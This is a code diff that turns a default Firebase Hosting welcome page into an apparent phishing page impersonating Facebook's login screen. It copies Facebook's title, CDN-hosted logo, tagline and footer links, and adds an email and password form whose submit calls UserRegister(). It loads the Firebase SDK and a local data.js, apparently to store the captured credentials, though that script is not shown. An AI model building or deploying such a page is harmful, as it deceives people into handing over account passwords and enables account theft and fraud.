@@ -1,89 +1,145 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Welcome to Firebase Hosting</title>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./style.css">
 
-    <!-- update the version number as needed -->
-    <script defer src="/__/firebase/9.22.2/firebase-app-compat.js"></script>
-    <!-- include only the Firebase features as you need -->
-    <script defer src="/__/firebase/9.22.2/firebase-auth-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-database-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-firestore-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-functions-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-messaging-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-storage-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-analytics-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-remote-config-compat.js"></script>
-    <script defer src="/__/firebase/9.22.2/firebase-performance-compat.js"></script>
-    <!-- 
-      initialize the SDK after all desired features are loaded, set useEmulator to false
-      to avoid connecting the SDK to running emulators.
-    -->
-    <script defer src="/__/firebase/init.js?useEmulator=true"></script>
+</head>
+<body>
 
-    <style media="screen">
-      body { background: #ECEFF1; color: rgba(0,0,0,0.87); font-family: Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-      #message { background: white; max-width: 360px; margin: 100px auto 16px; padding: 32px 24px; border-radius: 3px; }
-      #message h2 { color: #ffa100; font-weight: bold; font-size: 16px; margin: 0 0 8px; }
-      #message h1 { font-size: 22px; font-weight: 300; color: rgba(0,0,0,0.6); margin: 0 0 16px;}
-      #message p { line-height: 140%; margin: 16px 0 24px; font-size: 14px; }
-      #message a { display: block; text-align: center; background: #039be5; text-transform: uppercase; text-decoration: none; color: white; padding: 16px; border-radius: 4px; }
-      #message, #message a { box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }
-      #load { color: rgba(0,0,0,0.4); text-align: center; font-size: 13px; }
-      @media (max-width: 600px) {
-        body, #message { margin-top: 0; background: white; box-shadow: none; }
-        body { border-top: 16px solid #ffa100; }
-      }
-    </style>
-  </head>
-  <body>
-    <div id="message">
-      <h2>Welcome</h2>
-      <h1>Firebase Hosting Setup Complete</h1>
-      <p>You're seeing this because you've successfully setup Firebase Hosting. Now it's time to go build something extraordinary!</p>
-      <a target="_blank" href="https://firebase.google.com/docs/hosting/">Open Hosting Documentation</a>
+
+
+
+
+
+    <!-- logo: https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg -->
+
+    <div class="fix-m-header">
+        <img src="./assets/cell-phone.png" alt="Android">
+        <span>Get Facebook for Android and browse faster</span>
     </div>
-    <p id="load">Firebase SDK Loading&hellip;</p>
 
-    <script>
-      document.addEventListener('DOMContentLoaded', function() {
-        const loadEl = document.querySelector('#load');
-        // // 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
-        // // The Firebase SDK is initialized and available here!
-        //
-        // firebase.auth().onAuthStateChanged(user => { });
-        // firebase.database().ref('/path/to/ref').on('value', snapshot => { });
-        // firebase.firestore().doc('/foo/bar').get().then(() => { });
-        // firebase.functions().httpsCallable('yourFunction')().then(() => { });
-        // firebase.messaging().requestPermission().then(() => { });
-        // firebase.storage().ref('/path/to/ref').getDownloadURL().then(() => { });
-        // firebase.analytics(); // call to activate
-        // firebase.analytics().logEvent('tutorial_completed');
-        // firebase.performance(); // call to activate
-        //
-        // // 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
+    <div class="container">
+        <!-- main container -->
+        <div class="content">
+            <!-- logo container -->
+           <div class="left-content">
+               <div class="f-logo">
+                   <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
+               </div>
+               <h2 class="f-quote">Facebook helps you connect and share with the people in your life.</h2>
+           </div>
+           <!-- login form -->
+           <div class="right-content">
+               <div class="card">
+                <form id="form">
+                    <input type="email" id="eemail" placeholder="Email address or phone number" autocomplete="off"> <br>
+                    <input type="password" placeholder="Password" name="password" id="lpassword"> <br>
+                    <button type="submit"  onclick="UserRegister()" id="btn">Sign Up </button>
+                </form>
+                   <div class="forgotten-password">
+                       <a href="#">Forgotten Password?</a>
+                   </div>
 
-        try {
-          let app = firebase.app();
-          let features = [
-            'auth', 
-            'database', 
-            'firestore',
-            'functions',
-            'messaging', 
-            'storage', 
-            'analytics', 
-            'remoteConfig',
-            'performance',
-          ].filter(feature => typeof app[feature] === 'function');
-          loadEl.textContent = `Firebase SDK loaded with ${features.join(', ')}`;
-        } catch (e) {
-          console.error(e);
-          loadEl.textContent = 'Error loading the Firebase SDK, check the console.';
-        }
-      });
-    </script>
-  </body>
+                   <div class="divider"></div>
+
+                   <div class="" style="text-align: center;">
+                       <a class="crt-new-ac" href="#">Create New Account</a>
+                   </div>
+               </div>
+               <div class="crt-page">
+                   <a href="#">Create a Page</a>
+                   <span>for a celebrity, band or business.</span>
+               </div>
+           </div>
+        </div>
+    </div>
+
+    <footer class="f-lg-footer">
+        <ul>
+            <li><a href="">English (UK)</a></li>
+            <li><a href="">বাংলা</a></li>
+            <li><a href="">हिन्दी</a></li>
+            <li><a href="">اردو</a></li>
+            <li><a href="">नेपाली</a></li>
+            <li><a href="">ଓଡ଼ିଆ</a></li>
+            <li><a href="">Español</a></li>
+            <li><a href="">Português (Brasil)</a></li>
+            <li><a href="">Français (France)</a></li>
+            <li><a href="">Deutsch</a></li>
+            <li><a href="">Italiano</a></li>
+        </ul>
+        <div class="divider"></div>
+        <ul>  
+            <li><a href="">Sign Up</a></li>
+            <li><a href="">Log In</a></li>
+            <li><a href="">Messenger</a></li>
+            <li><a href="">Facebook Lite</a></li>
+            <li><a href="">Watch</a></li>
+            <li><a href="">Places</a></li>
+            <li><a href="">Games</a></li>
+            <li><a href="">Marketplace</a></li>
+            <li><a href="">Facebook Pay</a></li>
+            <li><a href="">Jobs</a></li>
+            <li><a href="">Oculus</a></li>
+            <li><a href="">Portal</a></li>
+            <li><a href="">Instagram</a></li>
+            <li><a href="">Local</a></li>
+            <li><a href="">Fundraisers</a></li>
+            <li><a href="">Services</a></li>
+            <li><a href="">Voting</a></li>
+            <li><a href="">Information Centre</a></li>
+            <li><a href="">About</a></li>
+            <li><a href="">Create ad</a></li>
+            <li><a href="">Create Page</a></li>
+            <li><a href="">Developers</a></li>
+            <li><a href="">Careers</a></li>
+            <li><a href="">Privacy</a></li>
+            <li><a href="">Cookies</a></li>
+            <li><a href="">AdChoices</a></li>
+            <li><a href="">Terms</a></li>
+            <li><a href="">Help</a></li>
+            <li><a href="">Settings</a></li>
+        </ul>
+    </footer>
+
+    <div class="m-footer">
+        <div class="m-f-lang">
+            <ul>
+                <li><a href="">English (UK)</a></li>
+                <li><a href="">বাংলা</a></li>
+                <li><a href="">हिन्दी</a></li>
+            </ul>
+            <ul>
+                <li><a href="">اردو</a></li>
+                <li><a href="">नेपाली</a></li>
+                <li><a href="">ଓଡ଼ିଆ</a></li>
+            </ul>
+        </div>
+        
+
+        <div style="clear: both;"></div>
+
+        <div class="links" style="text-align: center;">
+            <a href="#">About</a><a href="#">Help</a><a href="#">More</a>
+        </div>
+
+        <div style="font-weight: 600;text-align: center;margin: 10px 0;color: #777;">Facebook Inc</div>
+    </div>
+
+        
+
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-analytics.js"></script>
+    <script src="data.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+</body>
+
 </html>
